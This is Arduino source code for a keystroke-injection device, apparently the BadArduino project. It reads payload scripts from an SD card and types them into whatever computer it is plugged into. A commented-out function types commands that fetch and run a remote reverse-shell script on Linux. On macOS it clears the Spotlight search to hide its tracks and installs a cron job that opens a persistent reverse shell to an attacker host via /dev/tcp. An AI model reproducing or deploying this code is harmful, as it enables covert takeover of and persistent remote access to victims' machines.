int default_delay = 0;

void run_script(String fpath){
  File f = SD.open("/payloads/" + (String)os + "/" + fpath);
  // Loop through each line and execute the script
  Keyboard.begin();
  String line = "";
  short i = 0;
  while (f.available()){
    char c = f.read();
    if (c == '\n'){ // End of line, time to execute
      if (i == 0 && (line.startsWith("DEFAULTDELAY ") || line.startsWith("DEFAULT_DELAY "))){
        default_delay = line.startsWith("DEFAULTDELAY ") ? line.substring(13).toInt() : line.substring(14).toInt();
      } else {
        run_line(line);
      }
      line = "";
      i++;
    } else {
      line += f.read();
    }
  }
  f.close();
  Keyboard.end();
}

String prevLine = "";

void run_line(String line){
  short space = line.indexOf(' ');
  String first_word = (space > -1) ? line.substring(0,space) : line;
  String remainder = (space > -1) ? line.substring(space + 1) : "";
  if (first_word == "REM") { // Comment
    return;
  } else if (first_word == "STRING"){ // Type string
    Keyboard.print(remainder);
  } else if (first_word == "DELAY"){ // Delay
    delay(remainder.toInt());
  } else if (first_word == "REPEAT"){ // Repeat
    for (short i = 0; i < remainder.toInt(); i++){
      run_line(prevLine); // Recursively run previous line
    }
  } else if (is_key(line)){ // Single keypress
    Keyboard.write(get_key(line));
  } else if (is_key(first_word)){ // Multiple keypresses
    // Loop through each key listed
    short from = 0;
    short next = line.indexOf(' ', from);
    while (next > -1){ // Loop through while there are still more words
      next = line.indexOf(' ', from);
      String key = line.substring(from, next);
      Keyboard.press(get_key(key));
      from = next + 1;
    }
    // Do the last word
    Keyboard.press(get_key(line.substring(from)));
    Keyboard.releaseAll();
  }
  
  if (!line.startsWith("DELAY ")){ // Default delay if not manually defined
    delay(default_delay);
  }
  prevLine = line;
}

/*void inject_shell(){
  String master_url = "https://raw.githubusercontent.com/peterapps/BadArduino/master/client_scripts/";
  Keyboard.begin();
  String cmd;
  int str_len;
  switch (os){
    case 0: { // Linux
      // Open terminal
      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.press('t');
      delay(100);
      Keyboard.releaseAll();
      delay(1000);
      // Install the script and exit the terminal
      cmd = "wget -O - " + master_url + "reverse_shell_linux.sh | bash; exit";
      str_len = cmd.length() + 1;
      char cmd1[str_len];
      cmd.toCharArray(cmd1, str_len);
      Keyboard.print(cmd1);
      Keyboard.write(KEY_RETURN);
      break;
    } case 1: {// Mac
      // Open Spotlight search
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press(' ');
      delay(100);
      Keyboard.releaseAll();
      // Open terminal
      Keyboard.print("Terminal");
      delay(250);
      Keyboard.write(KEY_RETURN);
      // Open Spotlight search again
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press(' ');
      delay(100);
      Keyboard.releaseAll();
      // Clear Spotlight search to hide the evidence
      Keyboard.write(KEY_BACKSPACE);
      delay(250);
      Keyboard.write(KEY_ESC);
      delay(1500);
      // Terminate any current processes
      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press('c');
      delay(100);
      Keyboard.releaseAll();
      delay(100);
      Keyboard.write(KEY_RETURN);
      delay(100);
      // In the Terminal run a command
      // Keyboard.print("bash <(curl -s https://raw.githubusercontent.com/peterapps/BadArduino/master/client_scripts/reverse_shell_mac.sh)"); // Run install script
      String ip = "$(curl -L " + master_url + "ATTACKER_IP.txt)";
      String port = "$(curl -L " + master_url + "ATTACKER_PORT.txt)";
      cmd = "(crontab -l 2>/dev/null; echo \"* * * * * bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1\") | crontab - ";
      str_len = cmd.length() + 1;
      char cmd2[str_len];
      cmd.toCharArray(cmd2, str_len);
      Keyboard.print(cmd);
      Keyboard.write(KEY_RETURN);
      delay(5000); // TODO: Figure out how long it will take to install the script
      // Quit the Terminal
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('q');
      delay(100);
      Keyboard.releaseAll();
      break;
    }
  }
  delay(100);
  Keyboard.end();
}*/
